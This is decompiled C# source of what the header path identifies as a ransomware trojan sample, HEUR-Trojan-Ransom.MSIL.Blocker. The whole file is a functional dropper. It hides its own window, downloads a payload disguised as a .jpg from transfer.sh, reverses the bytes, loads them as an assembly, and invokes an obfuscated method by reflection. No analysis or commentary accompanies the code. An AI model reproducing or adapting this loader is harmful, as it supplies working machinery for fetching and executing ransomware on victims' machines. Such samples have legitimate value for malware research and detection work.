// Decompiled with JetBrains decompiler
// Type: Todbja.Program
// Assembly: Daggl, Version=92.4515.159.1, Culture=neutral, PublicKeyToken=null
// MVID: C0FD3344-1BB4-4E32-8431-827C8FBAF6DF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-72432ed9dc08002f4e1d8868c872dbba775c744b5eb6f6a17b41e584daae8a2f.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

namespace Todbja
{
  internal class Program
  {
    private static string fileName { get; set; }

    [STAThread]
    private static void Main(string[] args)
    {
      Native.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
      Program.Ping();
      Program.Cafe();
      Program.Tea();
    }

    private static void Cafe()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      Program.fileName = Assembly.Load(Program.Coffee().ToArray()).FullName;
      if (Program.fileName == null)
        throw new Exception();
    }

    private static List<byte> Coffee()
    {
      List<byte[]> numArrayList = new List<byte[]>();
      List<byte> byteList = new List<byte>();
      numArrayList.Add(new BinaryReader(WebRequest.Create("http://transfer.sh/get/bwkgO4/Daggl.jpg").GetResponse().GetResponseStream()).ReadBytes(88772362));
      foreach (byte num in numArrayList[0])
        byteList.Add(num);
      byteList.Reverse();
      return byteList;
    }

    private static void Tea()
    {
      if (Program.fileName == null)
        return;
      foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
      {
        if (assembly.FullName == Program.fileName)
          Console.WriteLine((string) assembly.GetType("Skmojkdepdqlpypbaysarjp.Obfybrrn").GetMethod("Turabklfkcb").Invoke((object) null, (object[]) null));
      }
    }

    private static void Ping()
    {
    }
  }
}
